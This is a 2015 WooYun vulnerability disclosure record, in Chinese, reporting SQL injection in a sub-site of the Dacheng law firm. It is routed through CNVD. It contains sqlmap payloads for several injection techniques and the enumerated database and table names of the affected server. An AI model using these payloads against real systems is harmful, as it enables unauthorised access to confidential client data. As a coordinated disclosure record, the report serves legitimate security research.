{"id": 82636, "wybug_id": "wooyun-2015-0150449", "wybug_title": "大成律师所某分站存在SQL注射漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "我是猪", "wybug_date": "2015-10-30 10:27", "wybug_open_date": "2015-12-18 14:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-18：\t细节向公众公开  简要描述： 我就要有账号了吗？？？ 详细说明：  **.**.**.**/rwsq/bbsRead.aspx?Category=1&KeyId=592&userId=admin    KeyId参数存在注入\nParameter: KeyId (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Category=1&KeyId=592' AND 8848=8848 AND 'MPXK'='MPXK&userId=admin    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: Category=1&KeyId=592' AND 9903=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(107)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (9903=9903) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113))) AND 'HeKQ'='HeKQ&userId=admin    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: Category=1&KeyId=592';WAITFOR DELAY '0:0:5'--&userId=admin    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind (comment)    Payload: Category=1&KeyId=592' WAITFOR DELAY '0:0:5'--&userId=admin---web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008available databases [14]:[*] dacheng_2009[*] dc60_new[*] dentons_integration[*] lawyer60[*] lawyer6020140710[*] lawyer6020140720[*] master[*] MIDDLE_U8[*] model[*] msdb[*] newdc60test[*] renwenshequ[*] tempdb[*] wenkusqlmap resumed the following injection point(s) from stored session:---Parameter: KeyId (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Category=1&KeyId=592' AND 8848=8848 AND 'MPXK'='MPXK&userId=admin    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: Category=1&KeyId=592' AND 9903=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(107)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (9903=9903) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113))) AND 'HeKQ'='HeKQ&userId=admin    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: Category=1&KeyId=592';WAITFOR DELAY '0:0:5'--&userId=admin    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind (comment)    Payload: Category=1&KeyId=592' WAITFOR DELAY '0:0:5'--&userId=admin---web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008Database: dacheng_2009[372 tables]+--------------------------------------+| CaseTree                             || CaseTreeDoc                          || ClientTree                           || ClientTreeDoc                        || OA_MAIL_FJ                           || OA_MAIL_GRYJJ                        || OA_MAIL_GRYXCS                       || OA_MAIL_POP3                         || OA_MAIL_YJ                           || OA_MAIL_YXCS                         || PMDVIEW_208                          || PMDVIEW_211                          || T_Patent_Limiting                    || T_bbs_huifu                          || T_bbs_list                           || T_bbs_menu                           || T_file                               || T_gonggao                            || T_office_book                        || T_office_djzq                        || T_office_fensuo                      || T_office_file                        || T_office_list                        || T_office_llml                        || T_office_menu\n表太多了，贴不过来，应该有很多的个人信息啥的\n\n\n\n   漏洞证明：  \n\n\n\n   修复方案：  ...   版权声明：转载请注明来源 我是猪@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-11-03 14:50 厂商回复： CNVD确认并复现所述情况，已由CNVD通过网站管理方公开联系渠道向其邮件通报，由其后续提供解决方案。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}